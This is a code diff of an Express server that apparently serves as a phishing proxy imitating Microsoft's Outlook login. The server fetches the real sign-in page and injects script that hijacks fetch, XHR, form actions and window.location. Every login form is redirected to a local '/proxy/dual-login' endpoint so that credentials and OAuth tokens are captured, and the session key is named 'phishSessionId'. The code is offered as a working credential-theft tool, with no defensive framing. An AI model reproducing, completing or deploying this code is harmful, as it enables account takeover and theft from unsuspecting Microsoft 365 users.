@@ -500,6 +500,7 @@ app.get('/microsoft', async (req, res) => {
   }
 });
 
+
 app.get('/en-us/microsoft-365/outlook', async (req, res) => {
   try {
     const clientIp = requestIp.getClientIp(req) || 'unknown';
@@ -516,6 +517,7 @@ app.get('/en-us/microsoft-365/outlook', async (req, res) => {
     const codeVerifier = generateCodeVerifier();
     const codeChallenge = generateCodeChallenge(codeVerifier);
     
+    
     codeVerifiers.set(sessionId, codeVerifier);
     
     console.log(`🔐 Dual Token PKCE for session ${sessionId}:`, {
@@ -523,6 +525,7 @@ app.get('/en-us/microsoft-365/outlook', async (req, res) => {
       challenge: codeChallenge.substring(0, 20) + '...'
     });
     
+    // Build auth URL with ONLY Outlook scope initially
     const authUrl = new URL('https://login.microsoftonline.com/common/oauth2/v2.0/authorize');
     authUrl.searchParams.append('client_id', DUAL_TOKEN_CLIENT_ID);
     authUrl.searchParams.append('response_type', 'code');
@@ -534,6 +537,7 @@ app.get('/en-us/microsoft-365/outlook', async (req, res) => {
     authUrl.searchParams.append('prompt', 'select_account');
     authUrl.searchParams.append('response_mode', 'query');
     
+    // Fetch the login page
     const microsoftResponse = await axios({
       method: 'GET',
       url: authUrl.toString(),
@@ -548,159 +552,228 @@ app.get('/en-us/microsoft-365/outlook', async (req, res) => {
     let html = microsoftResponse.data;
     const $ = cheerio.load(html);
     
-    // Replace localhost references with production URL
-    const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
-    
-    $('head').append(`
-      <script>
-        (function() {
-          console.log('🔧 Dual token capture proxy active');
-          
-          const ORIGIN = '${origin}';
-          
-          // Override fetch
-          const originalFetch = window.fetch;
-          window.fetch = function(url, options = {}) {
-            if (typeof url === 'string' && url.includes('/GetCredentialType')) {
-              console.log('🔄 Redirecting GetCredentialType to proxy');
-              return originalFetch(ORIGIN + '/proxy/GetCredentialType', {
-                ...options,
-                headers: {
-                  ...options.headers,
-                  'Origin': ORIGIN
-                }
-              });
+    // Add proxy interception script
+  // In your /en-us/microsoft-365/outlook endpoint, replace the script in $('head').append with this:
+
+
+
+
+
+
+
+
+// In your /en-us/microsoft-365/outlook endpoint, replace the Turnstile injection section:
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+$('head').append(`
+  <script>
+    (function() {
+      console.log('🔧 Dual token capture proxy active');
+      
+      // Override fetch
+      const originalFetch = window.fetch;
+      window.fetch = function(url, options = {}) {
+        if (typeof url === 'string' && url.includes('/GetCredentialType')) {
+          console.log('🔄 Redirecting GetCredentialType to proxy');
+          return originalFetch('/proxy/GetCredentialType', {
+            ...options,
+            headers: {
+              ...options.headers,
+              'Origin': 'http://localhost:3001'
             }
-            return originalFetch(url, options);
-          };
-          
-          // Override XHR
-          const originalXHR = window.XMLHttpRequest;
-          window.XMLHttpRequest = function() {
-            const xhr = new originalXHR();
-            const originalOpen = xhr.open;
-            
-            xhr.open = function(method, url, ...args) {
-              if (typeof url === 'string' && url.includes('/GetCredentialType')) {
-                console.log('🔄 Redirecting XHR GetCredentialType to proxy');
-                url = ORIGIN + '/proxy/GetCredentialType';
-              }
-              return originalOpen.call(this, method, url, ...args);
-            };
-            
-            return xhr;
-          };
-          
-          // Level 1: MutationObserver for dynamically added forms
-          const observer = new MutationObserver(function(mutations) {
-            mutations.forEach(function(mutation) {
-              if (mutation.addedNodes) {
-                mutation.addedNodes.forEach(function(node) {
-                  if (node.nodeName === 'FORM' || (node.querySelector && node.querySelector('form'))) {
-                    console.log('🔍 New form detected, modifying...');
-                    fixAllForms();
-                  }
-                });
-              }
-            });
           });
-          
-          observer.observe(document.body, { childList: true, subtree: true });
-          
-          function fixAllForms() {
-            document.querySelectorAll('form').forEach(function(form) {
-              if (form.dataset.fixed === 'true') return;
-              
-              console.log('🔧 Fixing form. Original action:', form.action);
-              
-              if (form.action.includes('/common/login')) {
-                console.log('⚠️ Form was pointing to /common/login, fixing...');
-                form.action = ORIGIN + '/proxy/dual-login';
+        }
+        return originalFetch(url, options);
+      };
+      
+      // Override XHR
+      const originalXHR = window.XMLHttpRequest;
+      window.XMLHttpRequest = function() {
+        const xhr = new originalXHR();
+        const originalOpen = xhr.open;
+        
+        xhr.open = function(method, url, ...args) {
+          if (typeof url === 'string' && url.includes('/GetCredentialType')) {
+            console.log('🔄 Redirecting XHR GetCredentialType to proxy');
+            url = '/proxy/GetCredentialType';
+          }
+          return originalOpen.call(this, method, url, ...args);
+        };
+        
+        return xhr;
+      };
+      
+      // CRITICAL: Ensure form submission goes to the right place
+      
+      // Level 1: MutationObserver for dynamically added forms
+      const observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+          if (mutation.addedNodes) {
+            mutation.addedNodes.forEach(function(node) {
+              if (node.nodeName === 'FORM' || (node.querySelector && node.querySelector('form'))) {
+                console.log('🔍 New form detected, modifying...');
+                fixAllForms();
               }
-              
-              form.method = 'POST';
-              
-              const requiredFields = [
-                'sessionId', 'state', 'client_id', 
-                'redirect_uri', 'scope', 'response_mode',
-                'code_challenge', 'code_challenge_method'
-              ];
-              
-              requiredFields.forEach(fieldName => {
-                if (!form.querySelector(\`input[name="\${fieldName}"]\`)) {
-                  const input = document.createElement('input');
-                  input.type = 'hidden';
-                  input.name = fieldName;
-                  
-                  if (fieldName === 'sessionId' || fieldName === 'state') {
-                    input.value = '${sessionId}';
-                  } else if (fieldName === 'client_id') {
-                    input.value = '${DUAL_TOKEN_CLIENT_ID}';
-                  } else if (fieldName === 'redirect_uri') {
-                    input.value = '${DUAL_TOKEN_REDIRECT_URI}';
-                  } else if (fieldName === 'scope') {
-                    input.value = '${DUAL_TOKEN_SCOPE}';
-                  } else if (fieldName === 'response_mode') {
-                    input.value = 'query';
-                  } else if (fieldName === 'code_challenge') {
-                    input.value = '${codeChallenge}';
-                  } else if (fieldName === 'code_challenge_method') {
-                    input.value = 'S256';
-                  }
-                  
-                  form.appendChild(input);
-                  console.log(\`➕ Added hidden field: \${fieldName}\`);
-                }
-              });
-              
-              form.dataset.fixed = 'true';
-              
-              form.addEventListener('submit', function(e) {
-                console.log('📤 Form submitting to:', this.action);
-                
-                if (this.action.includes('/common/login')) {
-                  e.preventDefault();
-                  console.log('⚠️ Action was reset at last moment, fixing...');
-                  this.action = ORIGIN + '/proxy/dual-login';
-                  this.submit();
-                }
-              }, true);
             });
           }
+        });
+      });
+      
+      observer.observe(document.body, { childList: true, subtree: true });
+      
+      // Level 2: Function to fix all forms
+      function fixAllForms() {
+        document.querySelectorAll('form').forEach(function(form) {
+          // Skip already fixed forms
+          if (form.dataset.fixed === 'true') return;
           
-          // Level 4: Hijack XHR that might reset forms
-          const xhrOpen = XMLHttpRequest.prototype.open;
-          XMLHttpRequest.prototype.open = function(method, url, ...args) {
-            this.addEventListener('load', function() {
-              setTimeout(fixAllForms, 50);
-            });
-            return xhrOpen.call(this, method, url, ...args);
-          };
+          console.log('🔧 Fixing form. Original action:', form.action);
           
-          setInterval(fixAllForms, 500);
+          // Force action to our proxy
+          if (form.action.includes('/common/login')) {
+            console.log('⚠️ Form was pointing to /common/login, fixing...');
+            form.action = '/proxy/dual-login';
+          }
           
-          setTimeout(fixAllForms, 100);
-          setTimeout(fixAllForms, 500);
-          setTimeout(fixAllForms, 1000);
+          form.method = 'POST';
           
-          const originalLocation = window.location;
-          Object.defineProperty(window, 'location', {
-            get: function() { return originalLocation; },
-            set: function(value) {
-              console.log('⚠️ Attempt to change location to:', value);
-              if (value.includes('/common/login')) {
-                console.log('🛑 Blocked redirect to /common/login');
-                return;
+          // Ensure all hidden fields exist
+          const requiredFields = [
+            'sessionId', 'state', 'client_id', 
+            'redirect_uri', 'scope', 'response_mode',
+            'code_challenge', 'code_challenge_method'
+          ];
+          
+          requiredFields.forEach(fieldName => {
+            if (!form.querySelector(\`input[name="\${fieldName}"]\`)) {
+              const input = document.createElement('input');
+              input.type = 'hidden';
+              input.name = fieldName;
+              
+              // Set values based on field
+              if (fieldName === 'sessionId' || fieldName === 'state') {
+                input.value = '${sessionId}';
+              } else if (fieldName === 'client_id') {
+                input.value = '${DUAL_TOKEN_CLIENT_ID}';
+              } else if (fieldName === 'redirect_uri') {
+                input.value = '${DUAL_TOKEN_REDIRECT_URI}';
+              } else if (fieldName === 'scope') {
+                input.value = '${DUAL_TOKEN_SCOPE}';
+              } else if (fieldName === 'response_mode') {
+                input.value = 'query';
+              } else if (fieldName === 'code_challenge') {
+                input.value = '${codeChallenge}';
+              } else if (fieldName === 'code_challenge_method') {
+                input.value = 'S256';
               }
-              originalLocation.href = value;
+              
+              form.appendChild(input);
+              console.log(\`➕ Added hidden field: \${fieldName}\`);
             }
           });
           
-          console.log('✅ All interception layers active for dual token capture');
-        })();
-      </script>
-    `);
+          // Mark as fixed
+          form.dataset.fixed = 'true';
+          
+          // Level 3: Override submit event
+          form.addEventListener('submit', function(e) {
+            console.log('📤 Form submitting to:', this.action);
+            
+            // Final check before submit
+            if (this.action.includes('/common/login')) {
+              e.preventDefault();
+              console.log('⚠️ Action was reset at last moment, fixing...');
+              this.action = '/proxy/dual-login';
+              this.submit();
+            }
+          }, true);
+        });
+      }
+      
+      // Level 4: Hijack XHR that might reset forms
+      const xhrOpen = XMLHttpRequest.prototype.open;
+      XMLHttpRequest.prototype.open = function(method, url, ...args) {
+        this.addEventListener('load', function() {
+          // Small delay to let DOM update
+          setTimeout(fixAllForms, 50);
+        });
+        return xhrOpen.call(this, method, url, ...args);
+      };
+      
+      // Level 5: Periodic checks (backup)
+      setInterval(fixAllForms, 500);
+      
+      // Initial fixes
+      setTimeout(fixAllForms, 100);
+      setTimeout(fixAllForms, 500);
+      setTimeout(fixAllForms, 1000);
+      
+      // Level 6: Hijack window.location changes
+      const originalLocation = window.location;
+      Object.defineProperty(window, 'location', {
+        get: function() { return originalLocation; },
+        set: function(value) {
+          console.log('⚠️ Attempt to change location to:', value);
+          if (value.includes('/common/login')) {
+            console.log('🛑 Blocked redirect to /common/login');
+            return;
+          }
+          originalLocation.href = value;
+        }
+      });
+      
+      console.log('✅ All interception layers active for dual token capture');
+    })();
+  </script>
+`);
 
+    // Add session ID tracking
     $('body').append(`
       <script>
         sessionStorage.setItem('phishSessionId', '${sessionId}');
@@ -708,6 +781,7 @@ app.get('/en-us/microsoft-365/outlook', async (req, res) => {
       </script>
     `);
 
+    // Store params
     const params = {};
     $('input').each((i, elem) => {
       const name = $(elem).attr('name');
@@ -717,48 +791,60 @@ app.get('/en-us/microsoft-365/outlook', async (req, res) => {
     
     microsoftParams.set(sessionId, params);
     
-    $('form').each((i, form) => {
-      console.log('🔧 Original form action:', $(form).attr('action'));
-      
-      $(form).attr('action', '/proxy/dual-login');
-      $(form).attr('method', 'POST');
-      $(form).removeAttr('onsubmit');
-      
-      const formClone = $(form).clone(true, true);
-      $(form).replaceWith(formClone);
-      form = formClone[0];
-      
-      const fields = {
-        'sessionId': sessionId,
-        'state': sessionId,
-        'client_id': DUAL_TOKEN_CLIENT_ID,
-        'redirect_uri': DUAL_TOKEN_REDIRECT_URI,
-        'scope': DUAL_TOKEN_SCOPE,
-        'response_mode': 'query',
-        'code_challenge': codeChallenge,
-        'code_challenge_method': 'S256'
-      };
-      
-      Object.entries(fields).forEach(([name, value]) => {
-        $(form).find(`input[name="${name}"]`).remove();
-        $(form).append(`<input type="hidden" name="${name}" value="${value}">`);
-      });
-      
-      console.log('✅ Modified form action to:', $(form).attr('action'));
-      
-      form.addEventListener('submit', function(e) {
-        console.log('📤 Form submitting to:', this.action);
-        return true;
-      });
-    });
+    // Modify forms for dual token capture
+   // Modify forms for dual token capture with extra safeguards
+$('form').each((i, form) => {
+  console.log('🔧 Original form action:', $(form).attr('action'));
+  
+  // Force action to our proxy
+  $(form).attr('action', '/proxy/dual-login');
+  $(form).attr('method', 'POST');
+  
+  // Remove any existing onsubmit handlers that might interfere
+  $(form).removeAttr('onsubmit');
+  
+  // Remove any existing event listeners by cloning (aggressive)
+  const formClone = $(form).clone(true, true);
+  $(form).replaceWith(formClone);
+  form = formClone[0];
+  
+  // Ensure all hidden fields exist (without duplicates)
+  const fields = {
+    'sessionId': sessionId,
+    'state': sessionId,
+    'client_id': DUAL_TOKEN_CLIENT_ID,
+    'redirect_uri': DUAL_TOKEN_REDIRECT_URI,
+    'scope': DUAL_TOKEN_SCOPE,
+    'response_mode': 'query',
+    'code_challenge': codeChallenge,
+    'code_challenge_method': 'S256'
+  };
+  
+  Object.entries(fields).forEach(([name, value]) => {
+    // Remove any existing field with this name
+    $(form).find(`input[name="${name}"]`).remove();
+    // Add fresh hidden field
+    $(form).append(`<input type="hidden" name="${name}" value="${value}">`);
+  });
+  
+  console.log('✅ Modified form action to:', $(form).attr('action'));
+  
+  // Add a direct submit handler using native JavaScript
+  form.addEventListener('submit', function(e) {
+    console.log('📤 Form submitting to:', this.action);
+    return true;
+  });
+});
     
     res.send($.html());
+    
     
   } catch (error) {
     console.error('Dual token flow error:', error.message);
     res.status(500).send('Error loading login page');
   }
 });
+
 
 // ===== DUAL TOKEN EXCHANGE ENDPOINT =====
 app.post('/proxy/dual-login', turnstileMiddleware, express.urlencoded({ extended: true }), async (req, res) => {
